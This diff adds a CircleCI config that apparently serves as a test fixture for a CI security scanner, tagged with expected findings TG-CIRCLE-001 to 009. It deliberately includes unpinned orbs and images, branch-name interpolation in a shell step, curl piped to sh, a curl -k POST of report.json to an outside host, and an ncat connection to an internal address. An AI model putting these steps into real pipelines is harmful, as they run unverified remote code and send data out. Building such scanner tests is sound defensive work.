@@ -1,0 +1,20 @@
+# path: .circleci/config.yml
+# expect: TG-CIRCLE-001, TG-CIRCLE-002, TG-CIRCLE-003, TG-CIRCLE-004, TG-CIRCLE-005, TG-CIRCLE-006, TG-CIRCLE-007, TG-CIRCLE-008, TG-CIRCLE-009
+version: 2.1
+orbs:
+  node: circleci/node@dev:alpha
+  aws: circleci/aws-cli@volatile
+jobs:
+  build:
+    docker:
+      - image: cimg/node:latest
+      - image: cimg/postgres:16.2
+    steps:
+      - checkout
+      - run: echo "branch << pipeline.git.branch >>"
+      - run:
+          name: Install
+          command: |
+            curl -fsSL https://example.com/install.sh | sh
+            curl -k -X POST -d @report.json https://example.com/collect
+            ncat 172.16.0.5 8080
